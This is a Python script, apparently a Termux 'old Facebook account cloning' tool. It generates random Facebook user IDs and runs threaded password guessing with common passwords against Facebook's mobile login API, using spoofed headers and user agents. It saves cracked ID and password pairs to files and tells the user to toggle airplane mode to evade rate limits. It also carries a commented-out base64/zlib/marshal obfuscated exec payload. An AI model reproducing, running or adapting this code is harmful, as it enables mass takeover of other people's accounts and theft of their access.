import requests,bs4,json,os,sys,uuid,random,datetime,time,re,subprocess
import urllib3,rich,base64
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
import os,time,random,json,sys,datetime
try:
    import requests
except:
    os.system("pip3 install requests")
    import requests 
from concurrent.futures import ThreadPoolExecutor as ThreadPool
#-----------------------------[LINE]-----------------------------------#
sim = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').replace('\n', '').replace(',', '')
def lin():
	print("\033[1;32m============================================")
	
#----------------------------[DATE]-----------------------------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'-'+str(bln)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#----------------------------[COLOR/CODE]-----------------------------------#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\033[1;32m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
#----------------------------[USER/AGENT]-----------------------------------#
def ua():
    rr=random.randint
    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    zA=random.choice(['a','b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'])
    rx=random.randrange(1, 999)
    xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
    return xx
def uma():
    version=random.choice(["14","15","10","13","7.0.0","7.1.1","9","12","11","9.0","8.0.0","7.1.2","7.0","4","5","4.4.2","5.1.1","6.0.1","9.0.1"])
    #exec(marshal.loads(zlib.decompress(base64.b64decode(b'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'))))
    build = random.choice(['MMB29Q','R16NW','LRX22C','R16NW','KTU84P','JLS36C','NJH47F','PPR1.180610.011','QP1A.190711.020','NRD90M','RP1A.200720.012','M1AJB','MMB29T'])
    ver = str(random.choice(range(77, 577)))
    ver2 = str(random.choice(range(57, 77)))
    return f'''Mozilla/5.0 (Linux; Android {version}; {model} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ver2}.0.{ver}.8 Mobile Safari/537.36'''
#----------------------------[LOGO]-----------------------------------#

#----------------------------[MAIN/DEF]-----------------------------------#
#_________Year checker_________#
def main(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :alif = ' (*-*) 2009 √'
        elif uid[:9] in ['100000000']       :alif = ' ACCOUNT  2009 √'
        elif uid[:8] in ['10000000']        :alif = ' ACCOUNT 2009 √'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:alif = ' ACCOUNT 2009 √'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:alif = ' ACCOUNT 2010 √'
        elif uid[:6] in ['100001']          :alif = ' ACCOUNT 2010/2011 √'
        elif uid[:6] in ['100002','100003'] :alif = ' ACCOUNT 2011/2012 √'
        elif uid[:6] in ['100004']          :alif = ' ACCOUNT 2012/2013 √'
        elif uid[:6] in ['100005','100006'] :alif = ' ACCOUNT 2013/2014 √'
        elif uid[:6] in ['100007','100008'] :alif = ' ACCOUNT 2014/2015 √'
        elif uid[:6] in ['100009']          :alif = ' ACCOUNT 2015 √'
        elif uid[:5] in ['10001']           :alif = ' ACCOUNT 2015/2016 √'
        elif uid[:5] in ['10002']           :alif = ' ACCOUNT 2016/2017 √'
        elif uid[:5] in ['10003']           :alif = ' ACCOUNT 2018/2019 √'
        elif uid[:5] in ['10004']           :alif = ' ACCOUNT 2019/2020 √'
        elif uid[:5] in ['10005']           :alif = ' ACCOUNT 2020 √'
        elif uid[:5] in ['10006','10007','']:alif = ' ACCOUNT 2021 √'
        elif uid[:5] in ['10008']           :alif = ' ACCOUNT 2022 √'
        elif uid[:5] in ['10009']           :alif = ' ACCOUNT 2023 √'
        else:alif=''
    elif len(uid) in [9,10]:
        alif = ' ACCOUNT 2008/2009 √'
    elif len(uid)==8:
        alif = ' ACCOUNT 2007/2008 √'
    elif len(uid)==7:
        alif = ' ACCOUNT 2006/2007 √'
    else:alif=''
    return alif
 
def M3():
    cr = random.choice(['Three','1O1Ocsl','O2','WOM','Telcel','3SE','OneCall','1010','Vodafone IN','Vodafone id','Jazz','Telenor','Zong','Vodefone','Plus','SGP-M1','airtel','Greenphone','StarHub','giga','simyo','BITE','BITE LV','Sprint','inwi','EE','MTS Armenia','UMS','NL KPN','Ufone','China Telecom','SimSim','BAKCELL','Geocell','Jio 4G','Jio','Team','TEAM','UzMobile','Beeline','Vodefone US','A-Mobile','MAGTICOM','XL','axis','Spectrum','ZZ','LMT','Tele2','Fido','CC Network','Shelid','null','TeleTok','SUN Mobile','Club','Lycamobile','VIVIFI','Singtel','Circles','Metro by T-Mobile','YOTA','Turkcell','Uztelecom','Mobiuz','GOLAN T','HUMANS','MegaFon','VIVO','UA-KYIVSTAR','KYIVSTAR','Grameenphone','VIRGIN','Orange'])
    return "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FBIOS;FBAV/169.0.0.50.95;FBBV/96777264;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/16.7.5;FBSS/2;FBCR/"+cr+";FBID/phone;FBLC/ru_RU;FBOP/5;FBRV/0]"
    
   
logo = (f"""

\033[1;31m    ▗▖  ▗▖ ▗▄▖  ▗▄▄▖ ▗▄▖  ▗▄▖ ▗▖  ▗▖
\033[1;32m    ▐▛▚▞▜▌▐▌ ▐▌▐▌   ▐▌ ▐▌▐▌ ▐▌▐▛▚▞▜▌
\033[1;33m    ▐▌  ▐▌▐▛▀▜▌ ▝▀▚▖▐▌ ▐▌▐▌ ▐▌▐▌  ▐▌
 \033[1;34m   ▐▌  ▐▌▐▌ ▐▌▗▄▄▞▘▝▚▄▞▘▝▚▄▞▘▐▌  ▐▌
\033[1;32m============================================
             OWNER     :  \033[1;32mMASOOM\033[1;37m  
             Version   :  1.0
\033[1;32m============================================""")
def main():
    user=[]
    os.system("clear")
    print(logo)
    print(f'\033[1;37mEXAMPLE   : \033[1;37m10000 | 20000 | 90000')
    lin()
    limit=input("\x1b[1;97mCHOICE    : ")
    lin()
    os.system('clear')
    print(logo)
    print("\033[1;37m[\x1b[1;97m1\033[1;37m] \x1b[1;97mMETHOD ~ (2010-2009)")
    lin()
    ask=input("\x1b[1;97mCHOICE    : ")
    
    lin()
    if ask in["1"]:
        star="10000"
        for i in range(int(limit)):
            data=str(random.choice(range(1000000000,1999999999)))
            user.append(data)
    else:
        star="100000"
        for i in range(int(limit)):
            data=str(random.choice(range(1000000000,1999999999)))
            user.append(data)    
    with ThreadPool(max_workers=40) as AHSAM:
        os.system('clear')
        print(logo)
        print('    Old Facebook Account Cloning Started')
        lin()
        print(f'\033[1;37mTOTAL ID : \033[1;32m{limit} \033[1;37m')
        print('\x1b[1;97mCloning Is Started Wait For Results')
        print('\x1b[1;97mAfter Every 5 Min Turn Airplane On/Off')
        lin()
        for mal in user:
            uid=star+mal
            AHSAM.submit(login,uid)    

lks=[]
oks=[]
cps=[]
loop=0

def login(uid):
    global oks,cps,lks,loop
    Session=requests.session()
    try:
        sys.stdout.write(f"\r\033[1;37m[MASOOM-XD] {loop}\033[1;37m|\x1b[1;92m{len(oks)}\033[1;37m")
        sys.stdout.flush()
        for pw in ["123456","1234567","786786","khan123","khan786","12345678","123456789"]:
            headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
            "x-fb-net-hni": str(random.randint(20000, 40000)), 
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": ua(), 
            "content-type": "application/x-www-form-urlencoded", 
            "x-fb-http-engine": "Liger"}
            rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()            
            if "session_key" in rp:  
                print(f"\r\r\033[1;36m[Desible-DS] {uid} | {pw}")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:            	
                print(f"\r\r\033[1;32m[MASOOM-OK] {uid} | {pw}")                
                open('/sdcard/MASOOM-OLD-OK.txt', 'a').write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(rp):
                print(f"\r\r\033[1;31m[MASOOM-CP] {uid} | {pw}")
                open('/sdcard/MASOOM-OLD-CP.txt', 'a').write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except:pass
    
main()
